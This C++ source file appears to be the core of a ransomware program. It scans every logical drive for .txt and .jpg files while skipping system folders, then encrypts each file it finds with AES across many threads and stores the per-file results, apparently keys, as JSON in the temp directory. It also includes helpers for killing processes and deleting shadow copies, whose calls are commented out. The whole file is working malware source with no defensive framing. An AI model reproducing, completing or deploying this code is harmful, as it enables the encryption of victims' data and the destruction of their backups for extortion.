#include <iostream>
#include <Windows.h>
#include <fstream>
#include <thread>
#include <vector>
#include <mutex>
#include <algorithm>
#include "Core/disk_id.h"
#include "Core/file_search.h"
#include "Helpers/convert_to_wstring.h"
#include "Helpers/save_results.h"
#include "Helpers/gen_str.h"
#include "Helpers/kill_procs.h"
#include "Helpers/del_shadows.h"
#include "Helpers/json.hpp"
#include "Core/file_enc.h"



int offline_enc();
int online_enc();



int main() {
    offline_enc();

    return 0;
}


int offline_enc() {
    // identify all drives
    std::map<std::string, std::vector<std::wstring>> drives = Disk_ID();
    // store all logical drives to an array
    std::vector<std::wstring> logicalDrives = drives["logical"];

    // generate a unique wstring:
    std::string randomTempStr = gen_str(8);
    std::wstring randomWStr(randomTempStr.begin(), randomTempStr.end());

    // path to temp directory
    WCHAR tempPath[MAX_PATH];
    GetTempPath(MAX_PATH, tempPath);
    std::wstring wstrTempPath(tempPath);
    // path to a text file for storing file paths
    std::wstring filePath = wstrTempPath + L"\\" + randomWStr + L".txt";

    // search for files in each drive & ignore forbidden folders 
    std::vector<std::wstring> fileTypes = { L".txt", L".jpg" };
    std::unordered_set<std::wstring> forbiddenDirs = { L"System Volume Information", L"Windows", L"Program Files", L"Users", 
                                                        L"PerfLogs", L"Recovery", L"Path", L"Program Files (x86)", L"$Recycle.Bin"};

    for (const auto& drive : logicalDrives) {
        std::vector<std::wstring> files = FileSearcher(drive, fileTypes, forbiddenDirs);
        SaveResultsToFile(filePath, files); 
    }
    
    // KillProcs();
    // nuke_vss();

    std::vector<std::wstring> filesToProcess;
    std::wifstream inFile(filePath);
    std::wstring line;
    while (std::getline(inFile, line)) {
        filesToProcess.push_back(line);
    }
    inFile.close();

    // Prepare for parallel processing
    const int maxThreads = std::min<int>(32, static_cast<int>(std::thread::hardware_concurrency()));
    std::vector<std::map<std::string, std::map<std::string, std::string>>> results(maxThreads);
    std::mutex resultMutex;

    // 2. Use parallelism to process multiple files simultaneously.
    auto processFiles = [&](int tid, int start, int end) {
        for (int i = start; i < end; ++i) {
            // 3. Encrypt the file.
            int requiredSize = WideCharToMultiByte(CP_UTF8, 0, filesToProcess[i].c_str(), -1, NULL, 0, NULL, NULL);
            std::string narrowFilePath(requiredSize, 0);
            WideCharToMultiByte(CP_UTF8, 0, filesToProcess[i].c_str(), -1, &narrowFilePath[0], requiredSize, NULL, NULL);
            narrowFilePath.pop_back(); // Remove the null-terminator

            auto encResult = AESEncrypt(narrowFilePath);
            for (const auto& [key, value] : encResult) {
                results[tid][key] = value;
            }
        }
    };

    std::vector<std::thread> threads;
    int blockSize = filesToProcess.size() / maxThreads;
    for (int t = 0; t < maxThreads; ++t) {
        int start = t * blockSize;
        int end = (t == maxThreads - 1) ? filesToProcess.size() : start + blockSize;
        threads.push_back(std::thread(processFiles, t, start, end));
    }

    for (auto& t : threads) {
        t.join();
    }

    // 4. Merge results.
    std::map<std::string, std::map<std::string, std::string>> combinedResult;
    for (const auto& res : results) {
        for (const auto& [key, value] : res) {
            combinedResult[key] = value;
        }
    }

    // 5. Convert combined dictionary to JSON.
    nlohmann::json j = combinedResult;

    // 6. Save the JSON to a randomly named file.
    std::string randomTempStrForJson = gen_str(8);  // Assuming you have this function from your provided code.
    std::wstring randomWStrForJson(randomTempStrForJson.begin(), randomTempStrForJson.end());
    std::wstring jsonPath = wstrTempPath + L"\\" + randomWStrForJson + L".json";
    std::ofstream jsonFile(jsonPath);
    jsonFile << j.dump(4);  // Formatting with 4 spaces as indentation.
    jsonFile.close();


    return 0;
}